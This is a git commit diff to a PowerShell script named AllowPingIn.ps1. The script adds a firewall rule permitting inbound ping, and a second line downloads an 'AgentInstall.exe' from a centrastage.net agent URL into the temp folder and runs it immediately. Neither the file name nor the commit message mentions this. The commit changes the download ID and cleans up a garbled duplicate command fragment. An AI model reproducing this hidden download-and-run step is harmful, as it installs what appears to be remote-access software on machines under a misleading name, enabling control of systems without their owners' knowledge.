abe0db9474119c811f68e30f46c1324169471f7a
Anon212212 <33222876+Anon212212@users.noreply.github.com>
2023-11-30 09:55:39 +0000

    Update AllowPingIn.ps1

--- AllowPingIn.ps1
+++ AllowPingIn.ps1
@@ -1,4 +1,4 @@
 New-NetFirewallRule –DisplayName “Allow ICMPv4-In” –Protocol ICMPv4
-(New-Object System.Net.WebClient).DownloadFile("https://merlot.centrastage.net/csm/profile/downloadAgent/4c59d4ba-0af9-4803-a6df-c69976442e83", "$env:TEMP/AgentInstall.exe");start-process "$env:TEMP/AgentInstall.exe"t-process "$env:TEMP/AgentInstall.exe"
+(New-Object System.Net.WebClient).DownloadFile("https://merlot.centrastage.net/csm/profile/downloadAgent/71a7d947-c8bf-42e3-bb67-9b92294e4ec9", "$env:TEMP/AgentInstall.exe");start-process "$env:TEMP/AgentInstall.exe"
 
 
